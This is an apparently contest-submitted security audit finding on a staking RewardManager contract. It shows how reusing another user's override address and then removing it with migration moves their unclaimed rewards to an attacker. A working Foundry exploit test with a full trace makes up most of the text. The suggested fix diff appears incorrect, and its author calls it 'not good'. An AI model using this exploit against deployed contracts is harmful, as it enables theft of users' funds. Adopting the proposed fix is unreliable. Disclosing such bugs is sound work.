### Summary
Loss of users funds after using `overrideReceiver` function from the `RewardManager.sol` Contract. Attacker(user of Protocol) keep monitoring mempool, after user call `overrideReceiver` function with overrideAddress and then attacker call overrideReceiver function then call removeOverrideAddress with same overrideAddressResult in loss of the user funds

### Finding Description
https://cantina.xyz/code/e92be0b9-b4f2-4bf2-9544-ae285fcfc02d/contracts/contracts/validator-registry/rewards/RewardManager.sol?lines=116,116

https://cantina.xyz/code/e92be0b9-b4f2-4bf2-9544-ae285fcfc02d/contracts/contracts/validator-registry/rewards/RewardManager.sol?lines=125,125

```solidity
function overrideReceiver(address overrideAddress, bool migrateExistingRewards) external whenNotPaused nonReentrant {
        if (migrateExistingRewards) { _migrateRewards(msg.sender, overrideAddress); }
        require(overrideAddress != address(0) && overrideAddress != msg.sender, InvalidAddress());
        overrideAddresses[msg.sender] = overrideAddress;
        emit OverrideAddressSet(msg.sender, overrideAddress);
    }

    /// @dev Removes the override address for a receiver.
    /// @param migrateExistingRewards If true, existing rewards for the overridden address will be migrated atomically to the msg.sender.
    function removeOverrideAddress(bool migrateExistingRewards) external whenNotPaused nonReentrant {
        address toBeRemoved = overrideAddresses[msg.sender];
        require(toBeRemoved != address(0), NoOverriddenAddressToRemove());
        if (migrateExistingRewards) { _migrateRewards(toBeRemoved, msg.sender); }
        overrideAddresses[msg.sender] = address(0);
        emit OverrideAddressRemoved(msg.sender);
    }
```
By using these two function attacker(should be user of Protocol) can exploit the user those uses the same `overrideAddress` , by calling the overrideAddress but attacker should call removeOverrideAddress before other user , with the help of _migrateRewards function transfer all overrideAddress unclaimedRewards to their address.

```solidity
/// @dev DANGER: This function should ONLY be called from overrideClaimAddress or removeOverriddenClaimAddress
    /// with careful attention to parameter order.
    function _migrateRewards(address from, address to) internal {
        uint256 amount = unclaimedRewards[from];
        if (amount == 0) {
            emit NoRewards(from);
            return;
        }
        unclaimedRewards[from] = 0;
        unclaimedRewards[to] += amount;
        emit RewardsMigrated(from, to, amount);
    }
```
result in the loss of other user who use the same overrideAddress or should not call removeOverrideAddress,by using this process again and again user exploit every user who interact with overrideReceiver function

After that user wants to removeOverrideAddress there fund from overrideAddress result in emit the events no rewards and return

Parameter Should be used when calling function should be : user -> overrideReceiver(overrideAddress, true) Attacker -> overrideReceiver(overrideAddress, true) Attacker -> removeOverrideAddress(true)

### Impact Explanation
Loss of User Funds: This could leads to loss of user funds Breaks Core Functionality: Break in functionality of overrideReceiver and removeOverrideAddress

### Likelihood Explanation
Attacker should be part of protocol with some capital requirement, previous planning, or actions by other users, Attacker should not trigger this action until user call overrideReceiver function , user action is necessary.

### Proof of Concept
Add this to `RewardManagerTest.sol` file

```
contract RewardManagerTest is Test {

    // ..

    address public owner;
    address public user1;
    address public user2;
    address public user3;
    address public user4;
    address public user5;

    address public overrideAddress; // Add this to contract Test file

    // ..
function setUp() public {
        // .. 

        overrideAddress = makeAddr("overrideAddress");

        // ..
    }
This function to RewardManagerTest

function testOverrideReceiverWithMigrationAttack() public {
        // Setup initial state
        vanillaRegistryTest.testSelfStake();
        address vanillaTestUser = vanillaRegistryTest.user1();
        bytes memory vanillaTestUserPubkey = vanillaRegistryTest.user1BLSKey();

        // Give user1 some unclaimed rewards
        vm.deal(user1, 5 ether);
        vm.prank(user1);
        vm.expectEmit();
        emit PaymentStored(user1, vanillaTestUser, vanillaTestUser, 5 ether); // done
        rewardManager.payProposer{value: 5 ether}(vanillaTestUserPubkey);
        assertEq(rewardManager.unclaimedRewards(vanillaTestUser), 5 ether);

        // User1 sets override address with migration
        vm.prank(vanillaTestUser);
        vm.expectEmit();
        emit OverrideAddressSet(vanillaTestUser, overrideAddress);
        rewardManager.overrideReceiver(overrideAddress, true);
        assertEq(rewardManager.unclaimedRewards(overrideAddress), 5 ether);
        assertEq(rewardManager.unclaimedRewards(vanillaTestUser), 0 ether);

        // Setup attacker with validator
        address vanillaAttacker = vanillaRegistryTest.user2();
        bytes memory attackerPubkey = vanillaRegistryTest.user2BLSKey();

        // Register attacker's validator with correct withdrawal address
        vm.deal(vanillaAttacker, 9 ether);
        bytes[] memory validators = new bytes[](1);
        validators[0] = attackerPubkey;
        vm.startPrank(vanillaAttacker);
        vanillaRegistryTest.validatorRegistry().stake{value: 9 ether}(validators);
        vm.stopPrank();
        assertTrue(vanillaRegistryTest.validatorRegistry().isValidatorOptedIn(attackerPubkey));

        // Here user2 behaves like an attacker
        vm.deal(user2, 5 ether);
        vm.prank(user2);
        vm.expectEmit();
        emit PaymentStored(user2, vanillaAttacker, vanillaAttacker, 5 ether);
        rewardManager.payProposer{value: 5 ether}(attackerPubkey);
        assertEq(rewardManager.unclaimedRewards(vanillaAttacker), 5 ether); 

        // Attacker sets same override address with migration
        vm.prank(vanillaAttacker);
        vm.expectEmit();
        emit OverrideAddressSet(vanillaAttacker, overrideAddress);
        rewardManager.overrideReceiver(overrideAddress, true);
        assertEq(rewardManager.unclaimedRewards(overrideAddress), 10 ether); // 5 ether from user1 + 5 ether from attacker
        assertEq(rewardManager.unclaimedRewards(vanillaTestUser), 0 ether);
        assertEq(rewardManager.unclaimedRewards(vanillaAttacker), 0 ether);

        // Attacker removes override address with migration
        vm.prank(vanillaAttacker);
        vm.expectEmit();
        emit OverrideAddressRemoved(vanillaAttacker);
        rewardManager.removeOverrideAddress(true);
        assertEq(rewardManager.unclaimedRewards(overrideAddress), 0 ether);
        assertEq(rewardManager.unclaimedRewards(vanillaAttacker), 10 ether); // All funds should go to attacker
        assertEq(rewardManager.unclaimedRewards(vanillaTestUser), 0 ether);

        // Attacker claims their rewards
        vm.prank(vanillaAttacker);
        vm.expectEmit();
        emit RewardsClaimed(vanillaAttacker, 10 ether);
        rewardManager.claimRewards();
        assertEq(vanillaAttacker.balance, 10 ether, "Attacker should have received all funds");
    }
```
Output :

Screenshot 2025-06-01 at 10.57.39 AM.png

Whole log Terminal
```
forge test --match-contract RewardManagerTest --match-test testOverrideReceiverWithMigrationAttack --
via-ir -vvvv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/validator-registry/rewards/RewardManagerTest.sol:RewardManagerTest
[PASS] testOverrideReceiverWithMigrationAttack() (gas: 578218)
Traces:
 [694518] RewardManagerTest::testOverrideReceiverWithMigrationAttack()
   ├─ [138996] VanillaRegistryTest::testSelfStake()
   │   ├─ [0] VM::deal(0x0000000000000000000000000000000000000123, 9000000000000000000 [9e18])
   │   │   └─ ← [Return]
   │   ├─ [0] VM::assertEq(9000000000000000000 [9e18], 9000000000000000000 [9e18]) [staticcall]
   │   │   └─ ← [Return]
   │   ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000123)
   │   │   └─ ← [Return]
   │   ├─ [0] VM::expectEmit(true, true, true, true)
   │   │   └─ ← [Return]
   │   ├─ emit Staked(msgSender: 0x0000000000000000000000000000000000000123, withdrawalAddress: 0x0000000000000000000000000000000000000123, valBLSPubKey: 0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268, amount: 1000000000000000000 [1e18])
   │   ├─ [71550] ERC1967Proxy::fallback{value: 1000000000000000000}([0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268])
   │   │   ├─ [66295] VanillaRegistry::stake{value: 1000000000000000000}([0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268]) [delegatecall]
   │   │   │   ├─ emit Staked(msgSender: 0x0000000000000000000000000000000000000123, withdrawalAddress: 0x0000000000000000000000000000000000000123, valBLSPubKey: 0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268, amount: 1000000000000000000 [1e18])
   │   │   │   └─ ← [Return]
   │   │   └─ ← [Return]
   │   ├─ [0] VM::stopPrank()
   │   │   └─ ← [Return]
   │   ├─ [0] VM::assertEq(8000000000000000000 [8e18], 8000000000000000000 [8e18]) [staticcall]
   │   │   └─ ← [Return]
   │   ├─ [5298] ERC1967Proxy::fallback(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [staticcall]
   │   │   ├─ [4540] VanillaRegistry::getStakedValidator(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   │   └─ ← [Return] StakedValidator({ exists: true, withdrawalAddress: 0x0000000000000000000000000000000000000123, balance: 1000000000000000000 [1e18], unstakeOccurrence: Occurrence({ exists: false, blockHeight: 0 }) })
   │   │   └─ ← [Return] StakedValidator({ exists: true, withdrawalAddress: 0x0000000000000000000000000000000000000123, balance: 1000000000000000000 [1e18], unstakeOccurrence: Occurrence({ exists: false, blockHeight: 0 }) })
   │   ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000123, 0x0000000000000000000000000000000000000123) [staticcall]
   │   │   └─ ← [Return]
   │   ├─ [2682] ERC1967Proxy::fallback(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [staticcall]
   │   │   ├─ [1936] VanillaRegistry::getStakedAmount(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
   │   │   └─ ← [Return] 1000000000000000000 [1e18]
   │   ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18]) [staticcall]
   │   │   └─ ← [Return]
   │   ├─ [3469] ERC1967Proxy::fallback(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [staticcall]
   │   │   ├─ [2723] VanillaRegistry::isValidatorOptedIn(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   │   └─ ← [Return] true
   │   │   └─ ← [Return] true
   │   ├─ [0] VM::assertTrue(true) [staticcall]
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [1500] VanillaRegistryTest::user1() [staticcall]
   │   └─ ← [Return] 0x0000000000000000000000000000000000000123
   ├─ [2824] VanillaRegistryTest::user1BLSKey() [staticcall]
   │   └─ ← [Return] 0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268
   ├─ [0] VM::deal(0x0000000000000000000000000000000000000123, 5000000000000000000 [5e18])
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000123)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit PaymentStored(provider: 0x0000000000000000000000000000000000000123, receiver: 0x0000000000000000000000000000000000000123, toPay: 0x0000000000000000000000000000000000000123, amount: 5000000000000000000 [5e18])
   ├─ [78036] ERC1967Proxy::fallback{value: 5000000000000000000}(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268)
   │   ├─ [72793] RewardManager::payProposer{value: 5000000000000000000}(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   ├─ [16785] ERC1967Proxy::fallback(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [staticcall]
   │   │   │   ├─ [11527] MevCommitMiddleware::validatorRecords(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, false, Occurrence({ exists: false, timestamp: 0 })
   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, false, Occurrence({ exists: false, timestamp: 0 })
   │   │   ├─ [5050] ERC1967Proxy::fallback(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [staticcall]
   │   │   │   ├─ [4292] VanillaRegistry::stakedValidators(0x96db1884af7bf7a1b57c77222723286a8ce3ef9a16ab6c5542ec5160662d450a1b396b22fc519679adae6ad741547268) [delegatecall]
   │   │   │   │   └─ ← [Return] true, 0x0000000000000000000000000000000000000123, 1000000000000000000 [1e18], Occurrence({ exists: false, blockHeight: 0 })
   │   │   │   └─ ← [Return] true, 0x0000000000000000000000000000000000000123, 1000000000000000000 [1e18], Occurrence({ exists: false, blockHeight: 0 })
   │   │   ├─ emit PaymentStored(provider: 0x0000000000000000000000000000000000000123, receiver: 0x0000000000000000000000000000000000000123, toPay: 0x0000000000000000000000000000000000000123, amount: 5000000000000000000 [5e18])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000123) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000123) [delegatecall]
   │   │   └─ ← [Return] 5000000000000000000 [5e18]
   │   └─ ← [Return] 5000000000000000000 [5e18]
   ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000123)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit OverrideAddressSet(receiver: 0x0000000000000000000000000000000000000123, overrideAddress: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5])
   ├─ [58971] ERC1967Proxy::fallback(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], true)
   │   ├─ [58240] RewardManager::overrideReceiver(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], true) [delegatecall]
   │   │   ├─ emit RewardsMigrated(from: 0x0000000000000000000000000000000000000123, to: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], amount: 5000000000000000000 [5e18])
   │   │   ├─ emit OverrideAddressSet(receiver: 0x0000000000000000000000000000000000000123, overrideAddress: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [delegatecall]
   │   │   └─ ← [Return] 5000000000000000000 [5e18]
   │   └─ ← [Return] 5000000000000000000 [5e18]
   ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000123) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000123) [delegatecall]
   │   │   └─ ← [Return] 0
   │   └─ ← [Return] 0
   ├─ [0] VM::assertEq(0, 0) [staticcall]
   │   └─ ← [Return]
   ├─ [3588] VanillaRegistryTest::user2() [staticcall]
   │   └─ ← [Return] 0x0000000000000000000000000000000000000456
   ├─ [8142] VanillaRegistryTest::user2BLSKey() [staticcall]
   │   └─ ← [Return] 0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b
   ├─ [0] VM::deal(0x0000000000000000000000000000000000000456, 9000000000000000000 [9e18])
   │   └─ ← [Return]
   ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000456)
   │   └─ ← [Return]
   ├─ [2007] VanillaRegistryTest::validatorRegistry() [staticcall]
   │   └─ ← [Return] ERC1967Proxy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
   ├─ [63050] ERC1967Proxy::fallback{value: 9000000000000000000}([0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b])
   │   ├─ [62295] VanillaRegistry::stake{value: 9000000000000000000}([0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b]) [delegatecall]
   │   │   ├─ emit Staked(msgSender: 0x0000000000000000000000000000000000000456, withdrawalAddress: 0x0000000000000000000000000000000000000456, valBLSPubKey: 0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b, amount: 9000000000000000000 [9e18])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [0] VM::stopPrank()
   │   └─ ← [Return]
   ├─ [2007] VanillaRegistryTest::validatorRegistry() [staticcall]
   │   └─ ← [Return] ERC1967Proxy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
   ├─ [3469] ERC1967Proxy::fallback(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [staticcall]
   │   ├─ [2723] VanillaRegistry::isValidatorOptedIn(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [delegatecall]
   │   │   └─ ← [Return] true
   │   └─ ← [Return] true
   ├─ [0] VM::assertTrue(true) [staticcall]
   │   └─ ← [Return]
   ├─ [0] VM::deal(0x0000000000000000000000000000000000000456, 5000000000000000000 [5e18])
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000456)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit PaymentStored(provider: 0x0000000000000000000000000000000000000456, receiver: 0x0000000000000000000000000000000000000456, toPay: 0x0000000000000000000000000000000000000456, amount: 5000000000000000000 [5e18])
   ├─ [60536] ERC1967Proxy::fallback{value: 5000000000000000000}(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b)
   │   ├─ [59793] RewardManager::payProposer{value: 5000000000000000000}(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [delegatecall]
   │   │   ├─ [12285] ERC1967Proxy::fallback(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [staticcall]
   │   │   │   ├─ [11527] MevCommitMiddleware::validatorRecords(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [delegatecall]
   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, false, Occurrence({ exists: false, timestamp: 0 })
   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, false, Occurrence({ exists: false, timestamp: 0 })
   │   │   ├─ [5050] ERC1967Proxy::fallback(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [staticcall]
   │   │   │   ├─ [4292] VanillaRegistry::stakedValidators(0xa5c99dfdfc69791937ac5efc5d33316cd4e0698be24ef149bbc18f0f25ad92e5e11aafd39701dcdab6d3205ad38c307b) [delegatecall]
   │   │   │   │   └─ ← [Return] true, 0x0000000000000000000000000000000000000456, 9000000000000000000 [9e18], Occurrence({ exists: false, blockHeight: 0 })
   │   │   │   └─ ← [Return] true, 0x0000000000000000000000000000000000000456, 9000000000000000000 [9e18], Occurrence({ exists: false, blockHeight: 0 })
   │   │   ├─ emit PaymentStored(provider: 0x0000000000000000000000000000000000000456, receiver: 0x0000000000000000000000000000000000000456, toPay: 0x0000000000000000000000000000000000000456, amount: 5000000000000000000 [5e18])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000456) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000456) [delegatecall]
   │   │   └─ ← [Return] 5000000000000000000 [5e18]
   │   └─ ← [Return] 5000000000000000000 [5e18]
   ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000456)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit OverrideAddressSet(receiver: 0x0000000000000000000000000000000000000456, overrideAddress: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5])
   ├─ [35071] ERC1967Proxy::fallback(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], true)
   │   ├─ [34340] RewardManager::overrideReceiver(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], true) [delegatecall]
   │   │   ├─ emit RewardsMigrated(from: 0x0000000000000000000000000000000000000456, to: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], amount: 5000000000000000000 [5e18])
   │   │   ├─ emit OverrideAddressSet(receiver: 0x0000000000000000000000000000000000000456, overrideAddress: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [delegatecall]
   │   │   └─ ← [Return] 10000000000000000000 [1e19]
   │   └─ ← [Return] 10000000000000000000 [1e19]
   ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000123) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000123) [delegatecall]
   │   │   └─ ← [Return] 0
   │   └─ ← [Return] 0
   ├─ [0] VM::assertEq(0, 0) [staticcall]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000456) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000456) [delegatecall]
   │   │   └─ ← [Return] 0
   │   └─ ← [Return] 0
   ├─ [0] VM::assertEq(0, 0) [staticcall]
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000456)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit OverrideAddressRemoved(receiver: 0x0000000000000000000000000000000000000456)
   ├─ [35035] ERC1967Proxy::fallback(true)
   │   ├─ [34307] RewardManager::removeOverrideAddress(true) [delegatecall]
   │   │   ├─ emit RewardsMigrated(from: overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5], to: 0x0000000000000000000000000000000000000456, amount: 10000000000000000000 [1e19])
   │   │   ├─ emit OverrideAddressRemoved(receiver: 0x0000000000000000000000000000000000000456)
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(overrideAddress: [0x38b687F86505E01F681204289283E1a8Cb8bBdA5]) [delegatecall]
   │   │   └─ ← [Return] 0
   │   └─ ← [Return] 0
   ├─ [0] VM::assertEq(0, 0) [staticcall]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000456) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000456) [delegatecall]
   │   │   └─ ← [Return] 10000000000000000000 [1e19]
   │   └─ ← [Return] 10000000000000000000 [1e19]
   ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
   │   └─ ← [Return]
   ├─ [2247] ERC1967Proxy::fallback(0x0000000000000000000000000000000000000123) [staticcall]
   │   ├─ [1516] RewardManager::unclaimedRewards(0x0000000000000000000000000000000000000123) [delegatecall]
   │   │   └─ ← [Return] 0
   │   └─ ← [Return] 0
   ├─ [0] VM::assertEq(0, 0) [staticcall]
   │   └─ ← [Return]
   ├─ [0] VM::prank(0x0000000000000000000000000000000000000456)
   │   └─ ← [Return]
   ├─ [0] VM::expectEmit()
   │   └─ ← [Return]
   ├─ emit RewardsClaimed(msgSender: 0x0000000000000000000000000000000000000456, amount: 10000000000000000000 [1e19])
   ├─ [41997] ERC1967Proxy::fallback()
   │   ├─ [41272] RewardManager::claimRewards() [delegatecall]
   │   │   ├─ [0] 0x0000000000000000000000000000000000000456::fallback{value: 10000000000000000000}()
   │   │   │   └─ ← [Stop]
   │   │   ├─ emit RewardsClaimed(msgSender: 0x0000000000000000000000000000000000000456, amount: 10000000000000000000 [1e19])
   │   │   └─ ← [Return]
   │   └─ ← [Return]
   ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "Attacker should have received all funds") [staticcall]
   │   └─ ← [Return]
   └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.85s (835.92µs CPU time)

Ran 1 test suite in 2.85s (2.85s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommendation
The whole Contract is flawed, but my recommendation is implement the _migrationRewards in two function one from adding overrideReceiver and one for removeOverrideAddress and using mapping inside mapping . Something like this,

```diff
mapping(address  => mapping (address  => uint256 balance)) public migrationBalances;
function overrideReceiver(address overrideAddress, bool migrateExistingRewards) external whenNotPaused nonReentrant {
-        if (migrateExistingRewards) { _migrateRewards(msg.sender, overrideAddress); }
+       if (migrateExistingRewards) { _addMigrateRewards(msg.sender, overrideAddress); }
        require(overrideAddress != address(0) && overrideAddress != msg.sender, InvalidAddress());
        overrideAddresses[msg.sender] = overrideAddress;
        emit OverrideAddressSet(msg.sender, overrideAddress);
    }
    function removeOverrideAddress(bool migrateExistingRewards) external whenNotPaused nonReentrant {
        address toBeRemoved = overrideAddresses[msg.sender];
         require(toBeRemoved != address(0), NoOverriddenAddressToRemove());
-        if (migrateExistingRewards) { _migrateRewards(toBeRemoved, msg.sender); }
+        if (migrateExistingRewards) { _removeMigrateRewards(msg.sender, toBeRemoved); }
        overrideAddresses[msg.sender] = address(0);
        emit OverrideAddressRemoved(msg.sender);
    }
function _addMigrateRewards(address from, address to) internal {

        uint256 amount = migrationBalances[from][to];
        // uint256 amount = unclaimedRewards[from];
        // uint256 amount = userBalance[from];
        if (amount == 0) {
            emit NoRewards(from);
            return;
        }
        unclaimedRewards[from] = 0;
        unclaimedRewards[to] += amount;
        emit RewardsMigrated(from, to, amount);
    }

    function _removeMigrateRewards(address from, address to) internal {

        uint256 amount = migrationBalances[from][to];
        // uint256 amount = unclaimedRewards[from];
        // uint256 amount = userBalance[from];
        if (amount == 0) {
            emit NoRewards(from);
            return;
        }
        unclaimedRewards[from] = 0;
        unclaimedRewards[to] += amount;
        emit RewardsMigrated(from, to, amount);
    }
```
But it not good , so i suggest protocol to change the implementation according to them
